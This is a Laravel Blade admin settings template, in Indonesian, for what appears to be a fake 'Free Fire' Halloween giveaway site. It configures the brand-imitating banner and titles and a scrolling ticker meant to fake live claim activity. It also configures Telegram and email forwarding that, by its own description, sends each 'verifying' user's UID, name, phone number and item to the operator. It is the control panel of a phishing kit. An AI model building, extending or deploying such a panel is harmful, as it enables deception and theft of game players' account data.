@extends('panel.layout')

@section('title', 'Pengaturan Frontend')
@section('page_title', 'PENGATURAN FRONTEND & NOTIFIKASI')

@section('content')
<div class="max-w-5xl mx-auto space-y-8">

  <form action="{{ route('panel.settings.update') }}" method="POST" enctype="multipart/form-data" class="space-y-8">
    @csrf

    <!-- SECTION 1: VISUAL FRONTEND & KONTEN EVENT -->
    <div class="glass-card rounded-2xl p-6 md:p-8 border-red-900/40">
      <div class="flex items-center space-x-3 mb-6 pb-4 border-b border-red-950">
        <div class="w-10 h-10 rounded-xl bg-red-950 border border-red-600/50 flex items-center justify-center text-red-400 text-lg">
          <i class="fa-solid fa-paintbrush"></i>
        </div>
        <div>
          <h3 class="font-gaming font-extrabold text-xl text-white tracking-wide">TAMPILAN & KONTEN EVENT WEB</h3>
          <p class="text-xs text-gray-400">Atur teks judul, banner HD, running ticker UID, dan status event</p>
        </div>
      </div>

      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
        
        <!-- Judul Tab Website -->
        <div>
          <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
            Judul Browser (Meta Title)
          </label>
          <input type="text" name="site_title" value="{{ old('site_title', $settings['site_title'] ?? '') }}"
                 class="w-full bg-[#180508] border border-red-900/60 focus:border-red-500 focus:ring-1 focus:ring-red-500 text-white text-sm rounded-xl py-2.5 px-4 outline-none"
                 placeholder="Free Fire – Dunia Mistis Halloween Event"/>
        </div>

        <!-- Status Event -->
        <div>
          <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
            Status Event Frontend
          </label>
          <select name="event_status" class="w-full bg-[#180508] border border-red-900/60 focus:border-red-500 focus:ring-1 focus:ring-red-500 text-white text-sm rounded-xl py-2.5 px-4 outline-none">
            <option value="active" {{ ($settings['event_status'] ?? 'active') === 'active' ? 'selected' : '' }}>🟢 AKTIF - Event Berjalan Normal</option>
            <option value="maintenance" {{ ($settings['event_status'] ?? '') === 'maintenance' ? 'selected' : '' }}>🟡 MAINTENANCE - Sedang Pemeliharaan</option>
            <option value="inactive" {{ ($settings['event_status'] ?? '') === 'inactive' ? 'selected' : '' }}>🔴 NONAKTIF - Event Ditutup</option>
          </select>
        </div>

        <!-- Judul Event -->
        <div>
          <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
            Judul Utama Event (Header)
          </label>
          <input type="text" name="event_title" value="{{ old('event_title', $settings['event_title'] ?? 'DUNIA MISTIS') }}"
                 class="w-full bg-[#180508] border border-red-900/60 focus:border-red-500 focus:ring-1 focus:ring-red-500 text-white text-sm rounded-xl py-2.5 px-4 outline-none font-bold"
                 placeholder="DUNIA MISTIS"/>
        </div>

        <!-- Subtitle Event -->
        <div>
          <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
            Subtitle / Notice Event
          </label>
          <input type="text" name="event_subtitle" value="{{ old('event_subtitle', $settings['event_subtitle'] ?? '') }}"
                 class="w-full bg-[#180508] border border-red-900/60 focus:border-red-500 focus:ring-1 focus:ring-red-500 text-white text-sm rounded-xl py-2.5 px-4 outline-none"
                 placeholder="AMBIL ITEM SPESIAL EVENT FREE FIRE"/>
        </div>

      </div>

      <!-- Banner Widescreen Image -->
      <div class="mt-6 pt-6 border-t border-red-950/60">
        <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
          Banner Widescreen HD Event (Header Artwork)
        </label>
        
        <!-- Current Banner Preview -->
        <div class="mb-3 max-w-md rounded-xl overflow-hidden border border-red-900/50 bg-black/60 shadow-lg">
          <img id="bannerPreview" 
               src="{{ asset($settings['banner_image'] ?? 'images/banner_full_hd.png') }}" 
               alt="Banner Preview" 
               class="w-full h-auto object-cover"/>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <span class="text-xs text-gray-400 block mb-1">Unggah Banner Baru (JPG/PNG/WebP, Max 5MB):</span>
            <input type="file" name="banner_file" accept="image/*"
                   onchange="previewImage(this, 'bannerPreview')"
                   class="w-full text-xs text-gray-300 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-red-950 file:text-red-300 hover:file:bg-red-900 cursor-pointer"/>
          </div>
          <div>
            <span class="text-xs text-gray-400 block mb-1">Atau gunakan URL Gambar Banner:</span>
            <input type="text" name="banner_url" value="{{ $settings['banner_image'] ?? '' }}"
                   class="w-full bg-[#180508] border border-red-900/60 text-white text-xs rounded-xl py-2 px-3 outline-none"
                   placeholder="images/banner_full_hd.png atau https://..."/>
          </div>
        </div>
      </div>

      <!-- Running Ticker UID -->
      <div class="mt-6 pt-6 border-t border-red-950/60">
        <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2 flex items-center justify-between">
          <span>Teks Running Ticker (Pemberitahuan Klaim Berjalan)</span>
          <span class="text-[11px] text-amber-400 font-normal">Pisahkan dengan tanda pipa ( | )</span>
        </label>
        <textarea name="ticker_text" rows="3"
                  class="w-full bg-[#180508] border border-red-900/60 focus:border-red-500 focus:ring-1 focus:ring-red-500 text-white text-xs font-mono rounded-xl p-3 outline-none leading-relaxed">{{ old('ticker_text', $settings['ticker_text'] ?? '') }}</textarea>
        <p class="text-[11px] text-gray-500 mt-1">Teks ini bergerak terus-menerus di atas grid 9 item memberi kesan live activity yang ramai.</p>
      </div>

      <!-- Footer Copyright -->
      <div class="mt-6 pt-6 border-t border-red-950/60">
        <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
          Teks Copyright Footer
        </label>
        <input type="text" name="footer_copyright" value="{{ old('footer_copyright', $settings['footer_copyright'] ?? '') }}"
               class="w-full bg-[#180508] border border-red-900/60 text-white text-xs rounded-xl py-2.5 px-4 outline-none"/>
      </div>

    </div>

    <!-- SECTION 2: TELEGRAM BOT INTEGRATION -->
    <div class="glass-card rounded-2xl p-6 md:p-8 border-red-900/40">
      <div class="flex items-center justify-between mb-6 pb-4 border-b border-red-950">
        <div class="flex items-center space-x-3">
          <div class="w-10 h-10 rounded-xl bg-sky-950 border border-sky-600/50 flex items-center justify-center text-sky-400 text-xl">
            <i class="fa-brands fa-telegram"></i>
          </div>
          <div>
            <h3 class="font-gaming font-extrabold text-xl text-white tracking-wide">NOTIFIKASI TELEGRAM BOT</h3>
            <p class="text-xs text-gray-400">Setiap user mengklik verifikasi, data akun (UID, nama, HP, item) otomatis terkirim ke Telegram</p>
          </div>
        </div>

        <label class="relative inline-flex items-center cursor-pointer">
          <input type="checkbox" name="telegram_enabled" value="1" {{ ($settings['telegram_enabled'] ?? '0') === '1' ? 'checked' : '' }} class="sr-only peer">
          <div class="w-11 h-6 bg-gray-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-sky-600"></div>
          <span class="ml-3 text-xs font-bold text-gray-300">Aktifkan Bot</span>
        </label>
      </div>

      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div>
          <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
            Token Bot Telegram
          </label>
          <input type="text" name="telegram_token" value="{{ old('telegram_token', $settings['telegram_token'] ?? '') }}"
                 class="w-full bg-[#180508] border border-red-900/60 focus:border-sky-500 focus:ring-1 focus:ring-sky-500 text-white font-mono text-xs rounded-xl py-2.5 px-4 outline-none"
                 placeholder="Contoh: 7123456789:AAHq_..."/>
          <p class="text-[11px] text-gray-500 mt-1">Dapatkan token bot dari @BotFather di aplikasi Telegram.</p>
        </div>

        <div>
          <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
            Chat ID / Grup ID Telegram
          </label>
          <input type="text" name="telegram_chat_id" value="{{ old('telegram_chat_id', $settings['telegram_chat_id'] ?? '') }}"
                 class="w-full bg-[#180508] border border-red-900/60 focus:border-sky-500 focus:ring-1 focus:ring-sky-500 text-white font-mono text-xs rounded-xl py-2.5 px-4 outline-none"
                 placeholder="Contoh: 123456789 atau -100123456789"/>
          <p class="text-[11px] text-gray-500 mt-1">Dapatkan Chat ID Anda melalui @userinfobot atau @getidsbot.</p>
        </div>
      </div>
    </div>

    <!-- SECTION 3: EMAIL NOTIFICATION -->
    <div class="glass-card rounded-2xl p-6 md:p-8 border-red-900/40">
      <div class="flex items-center justify-between mb-6 pb-4 border-b border-red-950">
        <div class="flex items-center space-x-3">
          <div class="w-10 h-10 rounded-xl bg-amber-950 border border-amber-600/50 flex items-center justify-center text-amber-400 text-xl">
            <i class="fa-solid fa-envelope"></i>
          </div>
          <div>
            <h3 class="font-gaming font-extrabold text-xl text-white tracking-wide">NOTIFIKASI GMAIL / EMAIL</h3>
            <p class="text-xs text-gray-400">Forward data verifikasi ke email tujuan</p>
          </div>
        </div>

        <label class="relative inline-flex items-center cursor-pointer">
          <input type="checkbox" name="email_enabled" value="1" {{ ($settings['email_enabled'] ?? '0') === '1' ? 'checked' : '' }} class="sr-only peer">
          <div class="w-11 h-6 bg-gray-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-amber-600"></div>
          <span class="ml-3 text-xs font-bold text-gray-300">Aktifkan Email</span>
        </label>
      </div>

      <div>
        <label class="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">
          Email Penerima (Tujuan Notifikasi)
        </label>
        <input type="email" name="email_destination" value="{{ old('email_destination', $settings['email_destination'] ?? '') }}"
               class="w-full max-w-md bg-[#180508] border border-red-900/60 focus:border-amber-500 text-white text-xs rounded-xl py-2.5 px-4 outline-none"
               placeholder="admin.kamu@gmail.com"/>
      </div>
    </div>

    <!-- SUBMIT BUTTON BAR -->
    <div class="sticky bottom-4 z-20 glass-card p-4 rounded-2xl border-red-900/60 shadow-2xl flex items-center justify-between backdrop-blur-xl">
      <div class="text-xs text-gray-400">
        <i class="fa-solid fa-circle-info text-amber-400 mr-1"></i> Perubahan akan langsung tampil di frontend secara real-time.
      </div>
      <button type="submit" 
              class="px-6 py-3 rounded-xl font-bold text-sm text-white bg-gradient-to-r from-red-600 to-amber-600 hover:from-red-500 hover:to-amber-500 shadow-lg shadow-red-900/50 transition-all flex items-center gap-2">
        <i class="fa-solid fa-floppy-disk"></i> SIMPAN SEMUA PENGATURAN
      </button>
    </div>

  </form>

  <!-- TEST TELEGRAM SEPARATE FORM -->
  <div class="glass-card rounded-2xl p-6 border-sky-900/40 bg-sky-950/20">
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
      <div>
        <h4 class="text-sm font-bold text-white flex items-center gap-2">
          <i class="fa-brands fa-telegram text-sky-400 text-base"></i> Uji Coba Pengiriman Telegram
        </h4>
        <p class="text-xs text-gray-400 mt-0.5">Pastikan Anda telah mengisi Token dan Chat ID lalu klik tombol di samping untuk mengetes koneksi.</p>
      </div>
      <form action="{{ route('panel.telegram.test') }}" method="POST">
        @csrf
        <button type="submit" 
                class="px-4 py-2 rounded-xl bg-sky-600 hover:bg-sky-500 text-white font-semibold text-xs shadow-md shadow-sky-900/40 transition-all flex items-center gap-2 shrink-0">
          <i class="fa-solid fa-paper-plane"></i> Kirim Pesan Tes Sekarang
        </button>
      </form>
    </div>
  </div>

</div>
@endsection

@section('scripts')
<script>
  function previewImage(input, previewId) {
    if (input.files && input.files[0]) {
      const reader = new FileReader();
      reader.onload = function(e) {
        document.getElementById(previewId).src = e.target.result;
      }
      reader.readAsDataURL(input.files[0]);
    }
  }
</script>
@endsection
